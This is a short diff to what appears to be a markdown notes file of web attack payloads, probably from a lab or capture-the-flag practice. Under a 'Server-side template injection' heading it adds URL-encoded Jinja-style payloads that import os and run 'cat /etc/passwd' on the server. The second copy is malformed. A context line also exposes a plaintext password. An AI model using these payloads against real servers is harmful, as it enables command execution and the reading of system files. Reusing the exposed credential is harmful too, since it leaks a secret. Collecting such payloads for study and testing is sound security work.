@@ -228,6 +228,9 @@ Password: eoj2zssgznqxoo2p3icm
 
 ## Server-side template injection
 
+{%25+import+os+%25}{{os.system('cat+/etc/passwd')
+
+%25+import+os+%25}{{os.system('cat+/etc/passwd'
 
 
 ## SQL injection
